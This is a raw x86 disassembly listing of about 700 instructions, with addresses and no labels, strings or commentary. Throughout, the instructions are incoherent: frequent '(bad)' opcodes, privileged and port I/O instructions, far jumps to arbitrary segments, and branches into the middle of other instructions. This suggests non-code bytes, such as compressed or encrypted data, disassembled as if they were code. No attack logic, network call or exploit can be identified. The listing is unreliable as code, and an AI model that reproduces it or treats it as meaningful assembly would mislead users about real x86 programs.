  411a72:	(bad)  
  411a74:	repz pop ebp
  411a76:	test   eax,0x5024f7ed
  411a7b:	push   0x2e84cadc
  411a80:	mov    eax,ds:0x64bb247
  411a85:	(bad)  
  411a86:	cmp    esi,eax
  411a88:	dec    esi
  411a89:	cmp    BYTE PTR [ebx+0x223c44c5],dl
  411a8f:	ffreep st(0)
  411a91:	js     0x411aa1
  411a93:	mov    BYTE PTR ds:0x8c8aedf0,bl
  411a99:	retf   0x7b36
  411a9c:	or     BYTE PTR ds:0x88ef767d,dl
  411aa2:	arpl   WORD PTR [esi+0x32],si
  411aa5:	and    DWORD PTR [ebp-0x68232bb1],ebx
  411aab:	retf   
  411aac:	cli    
  411aad:	(bad)
  411ab0:	cmp    ebp,DWORD PTR [eax]
  411ab2:	mov    dl,0xfe
  411ab4:	pusha  
  411ab5:	xchg   ecx,eax
  411ab6:	xchg   ebp,eax
  411ab7:	stos   BYTE PTR es:[edi],al
  411ab8:	mov    al,BYTE PTR [edi]
  411aba:	das    
  411abb:	ss test al,0x92
  411abe:	cmp    al,0xc9
  411ac0:	in     al,0xae
  411ac2:	dec    ecx
  411ac3:	aad    0x6b
  411ac5:	hlt    
  411ac6:	fcmove st,st(1)
  411ac8:	or     eax,0xfddf28b6
  411acd:	out    dx,eax
  411ace:	sbb    eax,0x70fe1a94
  411ad3:	push   esp
  411ad4:	int3   
  411ad5:	sub    eax,0x80c1adbb
  411ada:	pop    edx
  411adb:	hlt    
  411adc:	add    al,0x7c
  411ade:	test   eax,edx
  411ae0:	addr16 pop esp
  411ae2:	imul   ebp,ebp,0x2
  411ae5:	push   0xfb85f7fd
  411aea:	cmc    
  411aeb:	push   ebx
  411aec:	or     eax,0xa40cdb8b
  411af1:	mov    esp,DWORD PTR [ecx+0x6f]
  411af4:	mov    al,0x9d
  411af6:	dec    esi
  411af7:	ss stc 
  411af9:	sahf   
  411afa:	(bad)  
  411afb:	fsub   QWORD PTR [ebx+0x6c806d6f]
  411b01:	outs   dx,BYTE PTR ds:[esi]
  411b02:	jge    0x411b5b
  411b04:	and    DWORD PTR [ebx],esp
  411b06:	stc    
  411b07:	mov    ds:0x6eaff93f,eax
  411b0c:	push   ss
  411b0d:	inc    edx
  411b0e:	xchg   edi,eax
  411b0f:	dec    esp
  411b10:	cmps   BYTE PTR fs:[si],BYTE PTR es:[di]
  411b13:	sbb    al,0xc6
  411b15:	fnstenv [edi+0x4f09e7e5]
  411b1b:	push   cs
  411b1c:	cmovbe esi,DWORD PTR [edx]
  411b1f:	push   ss
  411b20:	pop    eax
  411b21:	pop    esp
  411b22:	clc    
  411b23:	push   ebp
  411b24:	mov    edi,0x7783191e
  411b29:	jmp    0xfcb92173
  411b2e:	and    ch,bl
  411b30:	hlt    
  411b31:	fst    QWORD PTR [esp+edi*2-0x4d272f10]
  411b38:	std    
  411b39:	pop    eax
  411b3a:	ret    
  411b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b3c:	xor    ecx,DWORD PTR [ebx+0x54]
  411b3f:	mov    ?,ecx
  411b41:	repnz adc eax,0x75837eae
  411b47:	nop
  411b48:	out    dx,eax
  411b49:	clc    
  411b4a:	mov    WORD PTR [esi],cs
  411b4c:	or     DWORD PTR [ebx+0x25],0x891b3e0a
  411b53:	stc    
  411b54:	popa   
  411b55:	mov    ah,0xe
  411b57:	mov    ?,WORD PTR [edx]
  411b59:	repz in al,dx
  411b5b:	sbb    DWORD PTR [ebp-0x4f860af7],ebp
  411b61:	cmp    DWORD PTR [edi-0x75cf8192],esp
  411b67:	xchg   ebx,eax
  411b68:	dec    esi
  411b69:	out    dx,eax
  411b6a:	push   cs
  411b6b:	and    cl,BYTE PTR [eax+0x7671379e]
  411b71:	mov    cl,0x2d
  411b73:	dec    edi
  411b74:	sar    esp,0x86
  411b77:	aam    0x5b
  411b79:	dec    esp
  411b7a:	jnp    0x411b57
  411b7c:	sub    DWORD PTR [eax],edx
  411b7e:	xor    al,bl
  411b80:	pop    ss
  411b81:	add    DWORD PTR [edx+eax*2-0x3f],esp
  411b85:	adc    bh,BYTE PTR [edx-0x2a]
  411b88:	pop    ds
  411b89:	mov    ecx,0x74e253f6
  411b8e:	inc    esp
  411b8f:	mov    al,0x5c
  411b91:	push   cs
  411b92:	dec    edi
  411b93:	push   es
  411b94:	inc    esp
  411b95:	xor    BYTE PTR [edx+0x1e5066f6],dh
  411b9b:	nop
  411b9c:	inc    ebx
  411b9d:	sbb    cl,BYTE PTR [ebp-0x3d]
  411ba0:	fsubrp st(4),st
  411ba2:	adc    eax,0xde1fe09a
  411ba7:	out    dx,al
  411ba8:	push   edi
  411ba9:	jmp    0xc5afbf60
  411bae:	and    DWORD PTR [ecx-0x9],0xffffffb1
  411bb2:	test   BYTE PTR [ebp+0x966f6a1],0x97
  411bb9:	or     eax,DWORD PTR [eax-0x5ce95be8]
  411bbf:	sti    
  411bc0:	popf   
  411bc1:	dec    esp
  411bc2:	xchg   esi,eax
  411bc3:	jecxz  0x411c26
  411bc5:	lock addr16 into 
  411bc8:	cmc    
  411bc9:	cmp    eax,DWORD PTR [ebx-0x19]
  411bcc:	repz xchg ah,dl
  411bcf:	sub    BYTE PTR [ecx+0x21],0x0
  411bd3:	shr    BYTE PTR [ebx-0x6b],1
  411bd6:	xor    ebx,DWORD PTR [edx-0x34ead1d8]
  411bdc:	retf   0xa7bc
  411bdf:	jmp    0x411bd2
  411be1:	sti    
  411be2:	push   ecx
  411be3:	icebp  
  411be4:	mov    edi,0xe92cdf54
  411be9:	aaa    
  411bea:	dec    eax
  411beb:	lods   eax,DWORD PTR ds:[esi]
  411bec:	stos   DWORD PTR es:[di],eax
  411bee:	daa    
  411bef:	dec    ecx
  411bf0:	retf   0xf479
  411bf3:	mov    ss,WORD PTR [edx]
  411bf5:	inc    esi
  411bf6:	icebp  
  411bf7:	arpl   WORD PTR [edx*8-0x52f311a],bx
  411bfe:	dec    ecx
  411bff:	xchg   esp,eax
  411c00:	stos   DWORD PTR es:[edi],eax
  411c01:	mov    ds:0xe95bf8ac,eax
  411c06:	push   esp
  411c07:	mov    ds:0x3d138c6d,al
  411c0c:	or     edx,ebp
  411c0e:	lods   al,BYTE PTR ds:[esi]
  411c0f:	and    eax,0x3696bae1
  411c14:	xor    al,0x1d
  411c16:	sub    bh,BYTE PTR [eax-0x6]
  411c19:	popa   
  411c1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c1b:	and    al,0x84
  411c1d:	add    al,0xc8
  411c1f:	jno    0x411bca
  411c21:	adc    ecx,0xffffffe3
  411c24:	mov    dh,0x3f
  411c26:	mov    ecx,0x3cc1285d
  411c2b:	xchg   DWORD PTR [ecx-0x20bcb48e],esp
  411c31:	jo     0x411c4d
  411c33:	ret    
  411c34:	int    0xb6
  411c36:	fwait
  411c37:	out    0xdf,eax
  411c39:	dec    BYTE PTR [esi]
  411c3b:	xchg   edx,eax
  411c3c:	xchg   DWORD PTR [ebp+0x1b672219],eax
  411c42:	xchg   edx,eax
  411c43:	stos   BYTE PTR es:[edi],al
  411c44:	loopne 0x411bdc
  411c46:	or     al,0xbd
  411c48:	in     al,dx
  411c49:	out    dx,eax
  411c4a:	dec    edx
  411c4b:	dec    ebx
  411c4c:	repz push eax
  411c4e:	lods   eax,DWORD PTR ds:[esi]
  411c4f:	add    bl,cl
  411c51:	into   
  411c52:	ror    BYTE PTR [eax-0x41208d44],0x46
  411c59:	mov    cs,WORD PTR [ebx]
  411c5b:	nop
  411c5c:	fsubr  QWORD PTR [edx+eiz*1]
  411c5f:	and    al,0x91
  411c61:	fdivrp st(4),st
  411c63:	jmp    0x87b4696d
  411c68:	cmc    
  411c69:	inc    edx
  411c6a:	sahf   
  411c6b:	cmp    esp,esp
  411c6d:	into   
  411c6e:	cmp    ebx,DWORD PTR [ebp+0x1fc5754e]
  411c74:	xchg   edx,eax
  411c75:	jb     0x411c4f
  411c77:	lods   eax,DWORD PTR ds:[esi]
  411c78:	retf   
  411c79:	sbb    ecx,DWORD PTR [esi-0x35]
  411c7c:	rol    DWORD PTR [ecx+edi*8-0x4],0x22
  411c81:	es sub eax,0x23231a28
  411c87:	mov    ds,WORD PTR [eax]
  411c89:	jge    0x411cf1
  411c8b:	inc    ebp
  411c8c:	das    
  411c8d:	mov    ds:0x2036dbd9,al
  411c92:	call   0x992b:0x83559a5a
  411c99:	or     eax,0xc8cc722f
  411c9e:	cmc    
  411c9f:	jge    0x411c78
  411ca1:	push   0xffffffd6
  411ca3:	(bad)  [eax+0x39265486]
  411ca9:	xor    al,0xa0
  411cab:	loope  0x411cc9
  411cad:	in     al,0xb7
  411caf:	add    bh,BYTE PTR [eax]
  411cb1:	cmp    al,0xd3
  411cb3:	ins    BYTE PTR es:[edi],dx
  411cb4:	cmp    al,ch
  411cb6:	pop    ebp
  411cb7:	sub    eax,0xf0be7fe7
  411cbc:	shl    BYTE PTR [edi],1
  411cbe:	fnstsw WORD PTR [edx-0x5c8dd10c]
  411cc4:	add    DWORD PTR [ebx+0x74],esi
  411cc7:	sub    DWORD PTR [esi+0x52f9a28],0xffffffe9
  411cce:	es or  edi,esp
  411cd1:	mov    al,ds:0x9105f145
  411cd6:	jae    0x411ca5
  411cd8:	mov    WORD PTR [eax-0x7a7071f2],?
  411cde:	test   BYTE PTR [ecx],dl
  411ce0:	lds    ebx,FWORD PTR [eax+edi*2+0x39f25de8]
  411ce7:	inc    ebx
  411ce8:	mov    ebx,0x7c947918
  411ced:	jp     0x411d15
  411cef:	fwait
  411cf0:	dec    ecx
  411cf1:	enter  0x6280,0x58
  411cf5:	sbb    bl,cl
  411cf7:	test   al,0x7b
  411cf9:	dec    edx
  411cfa:	mov    eax,0x50b34c04
  411cff:	js     0x411d0a
  411d01:	or     esp,esp
  411d03:	pop    ebx
  411d04:	imul   eax,DWORD PTR [ecx+ecx*8+0x14],0x60d69690
  411d0c:	or     esp,DWORD PTR [edi]
  411d0e:	retf   
  411d0f:	call   0x9991:0x7fd40e6c
  411d16:	adc    eax,0xbb66d3c0
  411d1b:	add    eax,0x2c6d7fd9
  411d20:	jne    0x411d34
  411d22:	fstp   QWORD PTR [edi]
  411d24:	ss test al,0xaa
  411d27:	xlat   BYTE PTR ds:[ebx]
  411d28:	dec    edi
  411d29:	mov    dl,0xab
  411d2b:	adc    DWORD PTR [bx+0x74],0xffffffd5
  411d30:	ins    DWORD PTR es:[edi],dx
  411d31:	ja     0x411d05
  411d33:	and    ebx,DWORD PTR [eax-0x52]
  411d36:	das    
  411d37:	outs   dx,BYTE PTR ds:[esi]
  411d38:	pop    ds
  411d39:	mov    eax,0xf3992fa6
  411d3e:	adc    DWORD PTR [esi-0x7b],eax
  411d41:	test   eax,0xfe60f684
  411d46:	lods   eax,DWORD PTR ds:[esi]
  411d47:	lahf   
  411d48:	cmp    dl,BYTE PTR [edi+0x7f]
  411d4b:	(bad)  
  411d4c:	jg     0x411da4
  411d4e:	test   eax,0x3baccb92
  411d53:	jle    0x411cec
  411d55:	pop    eax
  411d56:	(bad)  
  411d57:	adc    DWORD PTR [ebx+0x70179428],edx
  411d5d:	es push ebp
  411d5f:	stos   BYTE PTR es:[edi],al
  411d60:	leave  
  411d61:	mov    al,0xb8
  411d63:	xor    dl,ch
  411d65:	sbb    BYTE PTR [esi+0x2c],bl
  411d68:	mov    ebp,0xe489a9f9
  411d6d:	push   0x15
  411d6f:	ins    BYTE PTR es:[edi],dx
  411d70:	or     eax,0x7cd6d916
  411d75:	addr16 jmp 0x411d08
  411d78:	xchg   ecx,eax
  411d79:	sub    ecx,ebx
  411d7b:	repz fmul QWORD PTR [esp+ebx*4]
  411d7f:	mov    dh,0x17
  411d81:	popa   
  411d82:	fstp   DWORD PTR [ebx]
  411d84:	mov    eax,ds:0xafab6a3c
  411d8a:	cld    
  411d8b:	push   cs
  411d8c:	xlat   BYTE PTR ds:[ebx]
  411d8d:	les    ecx,FWORD PTR [ecx-0x3304d420]
  411d93:	xchg   edx,eax
  411d94:	jmp    0x411d56
  411d96:	cli    
  411d97:	cdq    
  411d98:	lock jne 0x411db7
  411d9b:	cmc    
  411d9c:	jb     0x411d40
  411d9e:	mov    WORD PTR [esi-0x444b45],es
  411da4:	jmp    0x68f3:0x1748cbf8
  411dab:	fild   QWORD PTR [ebx]
  411dad:	ins    BYTE PTR es:[edi],dx
  411dae:	clc    
  411daf:	sbb    dh,BYTE PTR [ebx+0x5b]
  411db2:	cmp    eax,0xeedfee12
  411db7:	test   DWORD PTR [esi+0x1eb6aea9],esp
  411dbd:	lods   eax,DWORD PTR ds:[esi]
  411dbe:	(bad)  
  411dbf:	pop    ds
  411dc0:	scas   eax,DWORD PTR es:[edi]
  411dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dc2:	cmp    ch,dh
  411dc4:	call   0xe4680a4
  411dc9:	and    al,0xda
  411dcb:	sbb    BYTE PTR [ebx],bl
  411dcd:	or     al,0xf1
  411dcf:	inc    ebp
  411dd0:	sbb    bl,ch
  411dd2:	(bad)  
  411dd3:	mov    WORD PTR [edi+0x7f],ds
  411dd6:	cmpxchg ecx,esi
  411dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dda:	not    ah
  411ddc:	add    esp,DWORD PTR [ebx+0x40d3189b]
  411de2:	imul   ebp,ebp,0xffffffbf
  411de5:	ficomp WORD PTR [ebx]
  411de7:	ficomp WORD PTR [ebx]
  411de9:	inc    ebx
  411dea:	in     al,dx
  411deb:	xchg   DWORD PTR [ebp-0x10],edi
  411dee:	jne    0x411db7
  411df0:	jmp    0x61ae4cfa
  411df5:	sub    eax,0xe082431b
  411dfa:	arpl   cx,cx
  411dfc:	xchg   ebx,eax
  411dfd:	cmp    bl,BYTE PTR [eax+0x33]
  411e00:	pop    ecx
  411e01:	ret    0x580d
  411e04:	daa    
  411e05:	adc    BYTE PTR [eax-0x19febbf7],0x2b
  411e0c:	(bad)  
  411e0d:	adc    ebp,DWORD PTR [ecx]
  411e0f:	nop
  411e10:	test   bl,ah
  411e12:	jg     0x411df0
  411e14:	test   BYTE PTR [esp+edx*8+0x5d],bh
  411e18:	xor    esp,DWORD PTR [esi-0x46]
  411e1b:	sar    DWORD PTR [edx],cl
  411e1d:	(bad)  
  411e1e:	xlat   BYTE PTR ds:[ebx]
  411e1f:	push   ebp
  411e20:	cli    
  411e21:	ja     0x411da3
  411e23:	in     eax,0x52
  411e25:	or     BYTE PTR [eax+0x4c],ah
  411e28:	lds    edx,FWORD PTR [ebx+0x15]
  411e2b:	push   edx
  411e2c:	mov    dh,0x1f
  411e2e:	bound  ebx,QWORD PTR ds:0x7ee79d41
  411e34:	fwait
  411e35:	and    esi,DWORD PTR [edx]
  411e37:	cdq    
  411e38:	shl    BYTE PTR [edi+0x627eb15b],cl
  411e3e:	mov    WORD PTR [eax],?
  411e40:	inc    BYTE PTR [ecx-0x6d]
  411e43:	(bad)  
  411e45:	xchg   edx,eax
  411e46:	jno    0x411e74
  411e48:	ds retf 
  411e4a:	or     al,BYTE PTR [esp+esi*1]
  411e4d:	add    cl,BYTE PTR [ebp+ecx*2+0x63]
  411e51:	lahf   
  411e52:	ds loope 0x411eb2
  411e55:	popf   
  411e56:	jg     0x411e0e
  411e58:	fwait
  411e59:	outs   dx,BYTE PTR ds:[esi]
  411e5a:	cmp    DWORD PTR [ebx-0x650ef1af],edi
  411e60:	pushf  
  411e61:	pop    es
  411e62:	pop    ebx
  411e63:	jecxz  0x411e61
  411e65:	fdiv   QWORD PTR [esp+ebp*8-0x7b]
  411e69:	cmp    BYTE PTR [ecx],bl
  411e6b:	sahf   
  411e6c:	pop    esp
  411e6d:	ins    BYTE PTR es:[edi],dx
  411e6e:	dec    esi
  411e6f:	sub    eax,esp
  411e71:	nop
  411e72:	das    
  411e73:	sub    DWORD PTR [edi-0x1f],ebp
  411e76:	xchg   edx,eax
  411e77:	lds    ecx,FWORD PTR ds:0xc32f72f1
  411e7d:	mov    ah,0xa7
  411e7f:	cmp    DWORD PTR [edi+0x37],edx
  411e82:	sbb    eax,0xf7da2261
  411e87:	test   al,0xa0
  411e89:	sbb    dl,BYTE PTR [ebx-0x22346b46]
  411e8f:	pop    esi
  411e90:	ds jecxz 0x411e9c
  411e93:	stos   DWORD PTR es:[edi],eax
  411e94:	aas    
  411e95:	stos   DWORD PTR es:[edi],eax
  411e96:	pop    ebx
  411e97:	es sub dl,0x61
  411e9b:	push   edx
  411e9c:	pop    ds
  411e9d:	inc    edi
  411e9e:	or     eax,0x3e5b38bc
  411ea4:	ins    DWORD PTR es:[edi],dx
  411ea5:	cwde   
  411ea6:	xchg   ecx,eax
  411ea7:	or     BYTE PTR [ebx],cl
  411ea9:	push   esi
  411eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eab:	in     al,0xe4
  411ead:	scas   eax,DWORD PTR es:[edi]
  411eae:	pop    ebx
  411eaf:	push   cs
  411eb0:	repnz sub eax,0xad999b2f
  411eb6:	dec    edx
  411eb7:	push   ss
  411eb8:	sub    ecx,DWORD PTR [esi+0x6d28e458]
  411ebe:	(bad)  
  411ebf:	jbe    0x411e44
  411ec1:	in     al,0x49
  411ec3:	mov    ds:0x7905b566,eax
  411ec8:	cmp    eax,0xfd3822b8
  411ecd:	sbb    DWORD PTR ds:0xacf0e804,eax
  411ed3:	(bad)  
  411ed4:	clc    
  411ed5:	jmp    0xe89047fc
  411eda:	leave  
  411edb:	fidivr WORD PTR [eax]
  411edd:	test   BYTE PTR [edx-0x371c9618],cl
  411ee3:	sbb    edx,ebp
  411ee5:	rcl    ah,cl
  411ee7:	daa    
  411ee8:	jmp    0x411f3a
  411eea:	or     al,0x7b
  411eec:	pop    ss
  411eed:	fldcw  WORD PTR [esi-0x2b7a073]
  411ef3:	rcr    BYTE PTR [ecx],cl
  411ef5:	enter  0x4268,0x79
  411ef9:	mov    bh,al
  411efb:	retf   
  411efc:	jmp    0x411f70
  411efe:	jno    0x411f2a
  411f00:	and    eax,0x16781a9d
  411f05:	add    DWORD PTR [esi+0x7c5c6fbf],edx
  411f0b:	mov    DWORD PTR [edx-0x1b7de358],eax
  411f11:	adc    eax,0x4df9e5df
  411f16:	add    DWORD PTR [edi-0xf],0x9387fb50
  411f1d:	inc    esi
  411f1e:	(bad)  
  411f1f:	(bad)  
  411f20:	and    al,0x34
  411f22:	repz inc edi
  411f24:	ins    BYTE PTR es:[edi],dx
  411f25:	adc    edx,esi
  411f27:	mov    bl,0xe6
  411f29:	leave  
  411f2a:	mov    ss,eax
  411f2c:	out    dx,eax
  411f2d:	std    
  411f2e:	sub    eax,0x174e43f
  411f33:	xor    al,0x4b
  411f35:	mov    edx,0x4e777a08
  411f3a:	out    dx,eax
  411f3b:	mov    edx,0xee1a0a45
  411f40:	sar    DWORD PTR [eax+0x75],cl
  411f43:	ins    BYTE PTR es:[edi],dx
  411f44:	cmp    eax,0x98077922
  411f49:	push   0x7992d162
  411f4e:	pop    esi
  411f4f:	push   esi
  411f50:	hlt    
  411f51:	test   BYTE PTR [esi+0x7ae24857],dl
  411f57:	loope  0x411f4f
  411f59:	(bad)  
  411f5a:	sti    
  411f5b:	sbb    bl,BYTE PTR [eax-0x3aa8f2e7]
  411f61:	outs   dx,BYTE PTR ds:[esi]
  411f62:	adc    bh,BYTE PTR [eax-0x78]
  411f65:	test   eax,0x32bcc712
  411f6a:	retf   0x5525
  411f6d:	or     eax,DWORD PTR [edx+0x6fc7d29d]
  411f73:	into   
  411f74:	xchg   esi,eax
  411f75:	in     al,0xd9
  411f77:	push   ds
  411f78:	push   0x2f5016e5
  411f7d:	ja     0x411f8f
  411f7f:	push   0xefebc54b
  411f84:	rol    DWORD PTR [ebp+0x37],1
  411f87:	ret    
  411f88:	xor    bh,al
  411f8a:	adc    DWORD PTR [ecx-0x4c6f33f1],0x3f
  411f91:	daa    
  411f92:	(bad)  
  411f93:	push   cs
  411f94:	mov    al,0x47
  411f96:	push   cs
  411f97:	and    BYTE PTR [esi],bl
  411f99:	fstp   DWORD PTR [edx-0x50]
  411f9c:	dec    eax
  411f9d:	repnz arpl di,bx
  411fa0:	rcl    BYTE PTR [edx-0x2963983b],cl
  411fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fa7:	sbb    ch,bl
  411fa9:	aad    0x89
  411fab:	sub    dl,BYTE PTR [esi]
  411fad:	xor    al,0x85
  411faf:	shl    DWORD PTR [ebp-0x35],0x7a
  411fb3:	in     eax,0xd8
  411fb5:	std    
  411fb6:	lds    edi,FWORD PTR [edx+0x6a]
  411fb9:	xor    DWORD PTR [eax-0x56],0x1cffb4a9
  411fc0:	mov    es,WORD PTR [edi+eiz*8+0x8]
  411fc4:	mov    esp,0x49f32715
  411fc9:	pop    edi
  411fca:	pop    esp
  411fcb:	adc    eax,0x8e9ae1e2
  411fd0:	fld    DWORD PTR [edx+0x1602429a]
  411fd6:	ds aam 0x91
  411fd9:	shr    BYTE PTR [edx-0x69],cl
  411fdc:	mov    bh,0x15
  411fde:	jae    0x412019
  411fe0:	fbld   TBYTE PTR [edi]
  411fe2:	and    eax,0xe12ab90b
  411fe7:	mul    BYTE PTR [edi]
  411fe9:	wrmsr  
  411feb:	xor    dl,BYTE PTR [ecx-0x77b38a]
  411ff1:	cs icebp 
  411ff3:	dec    eax
  411ff4:	icebp  
  411ff5:	aaa    
  411ff6:	repnz repnz cld 
  411ff9:	dec    ebp
  411ffa:	scas   al,BYTE PTR es:[edi]
  411ffb:	sahf   
  411ffc:	xor    al,BYTE PTR [ebp-0x3d95631b]
  412002:	cmp    eax,esi
  412004:	bound  eax,QWORD PTR [ebx+0x1f7f3117]
  41200a:	push   0x8357f4e0
  41200f:	push   0xffffffad
  412011:	jbe    0x411fc6
  412013:	mov    eax,0xa0f48e1f
  412018:	es add eax,eax
  41201b:	daa    
  41201c:	adc    DWORD PTR [ecx-0x72a1a7c6],0xffffffe2
  412023:	mov    ds:0xf00acf1,al
  412028:	cdq    
  412029:	retf   
  41202a:	cwde   
  41202b:	test   eax,0xa53a6557
  412030:	adc    ebp,edi
  412032:	xor    DWORD PTR [esi-0x78],0xf4390c60
  412039:	sub    DWORD PTR [eax],eax
  41203b:	pop    es
  41203c:	in     al,0xf8
  41203e:	xlat   BYTE PTR ds:[ebx]
  41203f:	pop    ds
  412040:	cdq    
  412041:	add    al,BYTE PTR [ecx]
  412043:	jecxz  0x412089
  412045:	jl     0x4120b6
  412047:	je     0x412089
  412049:	mov    bh,0x31
  41204b:	ins    DWORD PTR es:[edi],dx
  41204c:	jg     0x412045
  41204e:	jb     0x412096
  412050:	jmp    0x4120cf
  412052:	nop
  412053:	popf   
  412054:	xchg   BYTE PTR [edx+0x10],al
  412057:	shl    DWORD PTR [ebp+ebx*4-0x75],0x84
  41205c:	js     0x412048
  41205e:	sbb    DWORD PTR [ebp-0x2415ac87],eax
  412064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412065:	retf   
  412066:	hlt    
  412067:	push   0xffffffe1
  412069:	fmul   QWORD PTR ss:[ecx]
  41206c:	clc    
  41206d:	push   eax
  41206e:	mov    dl,0xaf
  412070:	les    esp,FWORD PTR [edi+eax*2+0xb]
  412074:	jl     0x4120a3
  412076:	mov    bh,0xc5
  412078:	mov    esp,0x5d4becd1
  41207d:	std    
  41207e:	bound  ebp,QWORD PTR [ebp+0xc]
  412081:	mov    esi,0xab87fb93
  412086:	xchg   DWORD PTR [eax-0x637d94bf],esp
  41208c:	pop    ebp
  41208d:	push   0x970de253
  412092:	mov    ah,BYTE PTR [ecx+0x35]
  412095:	mov    ecx,0x414b0626
  41209a:	inc    ecx
  41209b:	inc    edi
  41209c:	loopne 0x4120cd
  41209e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41209f:	daa    
  4120a0:	adc    al,0xa6
  4120a2:	cmp    edi,ebp
  4120a4:	out    0x2,eax
  4120a6:	or     eax,0x929aa001
  4120ab:	ret    0xf4d8
  4120ae:	inc    ebx
  4120af:	call   0x1249a763
  4120b4:	call   0xd536:0x9beedc3e
  4120bb:	(bad)  
  4120bc:	cdq    
  4120bd:	arpl   WORD PTR [esi+ebp*8-0x5],si
  4120c1:	cmp    DWORD PTR [ebp+0x55c514a],0x6452ca2
  4120cb:	and    BYTE PTR [eax],bh
  4120cd:	sub    eax,0xdf932442
  4120d2:	mov    ch,0xb7
  4120d4:	pop    esi
  4120d5:	sub    al,0x83
  4120d7:	mov    esi,0x5f37a0bc
  4120dc:	mov    ds:0x230a8866,eax
  4120e1:	xchg   esi,eax
  4120e2:	adc    al,0xca
  4120e4:	lea    ebp,[edi]
  4120e6:	sbb    al,ah
  4120e8:	lods   eax,DWORD PTR ds:[esi]
  4120e9:	inc    ebp
  4120ea:	jbe    0x41212e
  4120ec:	dec    esi
  4120ed:	jmp    0xbfb9672a
  4120f2:	mov    edi,0xf92e781c
  4120f7:	fnstcw WORD PTR [esi+0x26]
  4120fa:	es push ds
  4120fc:	push   esi
  4120fd:	rcl    DWORD PTR [edi+0xcc1eefc],cl
  412103:	inc    edx
  412104:	int3   
  412105:	cmp    dl,bl
  412107:	mov    ecx,eax
  412109:	out    0x87,al
  41210b:	lds    ebp,FWORD PTR [ecx+0x3cdaa2f5]
  412111:	or     BYTE PTR [ebx],dl
  412113:	mov    ds:0xeef350aa,al
  412118:	push   ss
  412119:	clc    
  41211a:	xchg   ecx,eax
  41211b:	fild   DWORD PTR [edx-0x19]
  41211e:	dec    ebx
  41211f:	push   ds
  412120:	inc    ebp
  412121:	adc    ebx,edx
  412123:	test   esp,0x18876131
  412129:	push   0x37ed6c29
  41212e:	adc    ah,ch
  412130:	mov    ds:0x1521e79c,eax
  412135:	mov    eax,0x4403f049
  41213a:	push   ss
  41213b:	int3   
  41213c:	jp     0x412185
  41213e:	(bad)  
  41213f:	xchg   edx,eax
  412140:	or     ebp,DWORD PTR [ecx-0x47]
  412143:	rol    BYTE PTR [ecx],cl
  412145:	dec    esp
  412146:	clc    
  412147:	das    
  412148:	mov    ecx,0xf6a29820
  41214d:	push   edx
  41214e:	add    DWORD PTR [edx],edi
  412150:	inc    esi
  412151:	inc    edx
  412152:	and    bl,BYTE PTR [edi+0x43]
  412155:	ja     0x412141
  412157:	fild   WORD PTR [edx+0x7f]
  41215a:	dec    edx
  41215b:	xor    BYTE PTR [edx-0x1328877],cl
  412161:	pop    ds
  412162:	fmul   QWORD PTR [ebx+0x5]
  412165:	enter  0xd3e1,0x8d
  412169:	bound  eax,QWORD PTR [eax]
  41216b:	fsubrp st(4),st
  41216d:	cs mov esp,ebx
  412170:	imul   DWORD PTR [edi]
  412172:	stc    
  412173:	xor    BYTE PTR [eax+0x4b026237],0x5b
  41217a:	int3   
  41217b:	dec    edx
  41217c:	dec    eax
  41217d:	xor    DWORD PTR [ebp-0x77],edi
  412180:	int3   
  412181:	push   ecx
  412182:	neg    BYTE PTR [edx-0x28]
  412185:	jne    0x4121e8
  412187:	jae    0x412156
  412189:	jmp    0x41213b
  41218b:	imul   DWORD PTR [ebx+0xc1c3ada]
  412191:	test   eax,0x1b99922a
  412196:	fild   WORD PTR [esp+ecx*1]
  412199:	jle    0x412177
  41219b:	fst    DWORD PTR [eax+0x2b2c2404]
  4121a1:	ror    BYTE PTR [edi],1
  4121a3:	rcr    DWORD PTR [eax-0xd],1
  4121a6:	cmp    al,0x52
  4121a8:	sub    eax,0x9d830794
  4121ad:	dec    BYTE PTR [edx+0x4a6276b7]
  4121b3:	sbb    al,0x1c
  4121b5:	jns    0x41216c
  4121b7:	in     eax,0x8b
  4121b9:	xchg   ebp,eax
  4121ba:	ds add eax,0xdfaa8c80
  4121c0:	cmp    esp,DWORD PTR [edi]
  4121c2:	jae    0x412195
  4121c4:	scas   eax,DWORD PTR es:[edi]
  4121c5:	mov    esi,0x8a9ec4ca
  4121ca:	and    al,0xe9
  4121cc:	or     dl,BYTE PTR [edi+0x31]
  4121cf:	or     BYTE PTR [esi+0x2f],bl
  4121d2:	inc    edi
  4121d3:	dec    ebx
  4121d4:	aam    0xfd
  4121d6:	(bad)  
  4121d7:	fiadd  DWORD PTR [eax+0x1b]
  4121da:	test   BYTE PTR [eax+0x20],ch
  4121dd:	jno    0x41218b
  4121df:	adc    BYTE PTR [ebx],0xdb
  4121e2:	jg     0x4121b8
  4121e4:	pop    ebp
  4121e5:	das    
  4121e6:	scas   eax,DWORD PTR es:[edi]
  4121e7:	cs sbb ah,ch
  4121ea:	cmp    DWORD PTR [ebx],ecx
  4121ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121ed:	or     cl,BYTE PTR [edx]
  4121ef:	outs   dx,BYTE PTR ds:[esi]
  4121f0:	loopne 0x4121e9
  4121f2:	push   cs
  4121f3:	(bad)  
  4121f4:	xor    eax,0xd4cb1bf6
  4121f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121fa:	push   ebp
  4121fb:	bound  esp,QWORD PTR [esi-0x4a]
  4121fe:	lods   al,BYTE PTR ds:[esi]
  4121ff:	aad    0x5f
  412201:	ja     0x412191
  412203:	scas   eax,DWORD PTR es:[edi]
  412204:	iret   
  412205:	mov    ecx,0x899ea126
  41220a:	dec    esi
  41220b:	jne    0x412203
  41220d:	push   ebx
  41220e:	int3   
  41220f:	mov    ecx,DWORD PTR [esi+edx*8-0x3a]
  412213:	shl    ebx,1
  412215:	(bad)  
  412216:	fisttp WORD PTR [edx-0x42]
  412219:	stc    
  41221a:	retf   0x3aee
  41221d:	std    
  41221e:	pop    eax
  41221f:	and    ah,dl
  412221:	mov    bh,0xf8
  412223:	mov    al,ds:0xb4146307
